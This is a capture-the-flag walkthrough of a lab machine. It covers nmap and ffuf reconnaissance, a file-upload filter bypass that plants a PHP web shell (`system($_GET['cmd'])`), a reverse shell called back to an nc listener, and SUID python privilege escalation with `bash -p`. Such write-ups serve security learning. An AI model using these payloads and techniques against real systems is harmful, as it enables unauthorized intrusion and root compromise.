# Part 1 Reconnaissance

First things first, we get the IP and connect to the VPN, then add the IP to `/etc/hosts` and run an Nmap scan because the first question is:
```
Scan the machine, how many ports are open?
```
After doing the simple Nmap scan with `nmap -sV <room_ip>` I got:

![nmap scan result](nmap_room.png)

We can clearly see how many ports are open.

This Nmap result also reveals the answers to the 2nd and 3rd questions.

The 4th question doesn't need an answer.

For the 5th question, we will use `ffuf` without the need for any additional tools.

The command we will use is:
```
ffuf -u http://<room_ip>/FUZZ -w /home/Seclists/Discovery/Web-Content/common.txt
```


![ffuf result](ffuf_res.png)


As we can see, the unusual directory name that matches the number of words required in the 5th question is a notable directory.

# Part 2 Initial Foothold

At the hidden endpoint, when we hit it in the browser, it allows us to upload files to the server. Uploaded files can be viewed at another endpoint that was already found in the ffuf result.

A malicious file upload can lead to RCE. Since the page is a PHP file, we will use `<?php system($_GET['cmd']); ?>` inside our uploaded file to test whether the server allows RCE. To verify this, we first ensure the file uploads, then check its execution.

It allows uploading all file types except PHP — it filters files that have a `.php` extension. After a bunch of bypass attempts:

- **Try 1** — Modified filename with `.jpg` and content type to `image/jpg` via Burp interceptor.
- **Try 2** — Modified filename with `.txt` and content type to `plain/txt` via Burp interceptor.
- **Try 3** — Straight filename with `.php` and content type to `application/x-php` via Burp interceptor.
- **Try 4** — Modified filename with `.php.jpg` and content type to `image/jpg` via Burp interceptor.
- **Try 5** — Modified filename with `.php.txt` and content type to `plain/txt` via Burp interceptor.
- **Try 6** — Straight filename with `.php` and content type to `image/jpg` via Burp interceptor.
- **Try 7** — Straight filename with `.php` and content type to `plain/txt` via Burp interceptor.
- **Try 8** — Modified magic header of jpg + Modified filename with `.jpg` and content type to `image/jpg` via Burp interceptor.
- **Try 9** — Modified magic header of jpg + Modified filename with `.txt` and content type to `plain/txt` via Burp interceptor.
- **Try 10** — Modified magic header of jpg + Straight filename with `.php` and content type to `application/x-php` via Burp interceptor.
- **Try 11** — Modified magic header of jpg + Modified filename with `.php.jpg` and content type to `image/jpg` via Burp interceptor.
- **Try 12** — Modified magic header of jpg + Modified filename with `.php.txt` and content type to `plain/txt` via Burp interceptor.
- **Try 13** — Modified filename with `.php5` and content type to `plain/txt` via Burp interceptor.

![file upload bypass](file_upload.png)

# Getting a Shell - Part 3

After the file successfully uploads, we check its execution at the upload endpoint.

We will hit this URL: `http://<ip>/<upload_endpoint>?cmd=whoami`

If we get any output back, we can now get a shell.

Go to [revshells.com](https://revshells.com), copy the IP under your `tun0` interface and enter it there. On your local machine, set up the listener with `nc -lvnp 4444`, and under all types of shell select python simplest then copy and generate the simplest Python reverse shell command.

When you hit this endpoint:
```
http://<ip>/<upload_endpoint>?cmd=<reverse_shell_command>
```
You will get a connection back in your terminal and you now have a shell.

Poke around and you will find the user flag at `/var/www` in the shell.

![user flag](user_flag.png)

And that's how Q6 gets solved.

# Privilege Escalation - Part 4

For Q7, we will run the command given in the hint inside the reverse shell:

![SUID permissions](perm_image.png)

Spot the file from the above image whose permission looks unusual.

Name that file as the answer to question 7.

As the hint for Q8 suggests, search for that binary on GTFOBins.

Searching for it gives:

![gtfobins result](gtfo_bins.png)

Here you can clearly see the command `python3 -c 'import os; os.execl("/bin/sh", "sh")'`.

However, this command doesn't work. It's a classic gotcha —
it fails because the binary has the SUID bit set, but when you spawn a shell through `os.execl`, the shell drops privileges for safety. Modern `/bin/sh` (dash) and `/bin/bash` both do this by default.

We use `-p` to preserve privileges. The **working** command is:
```
python2.7 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

The `-p` option tells Bash not to drop the SUID privileges.

Now, doing similar enumeration as in Q6, you will find the root flag.
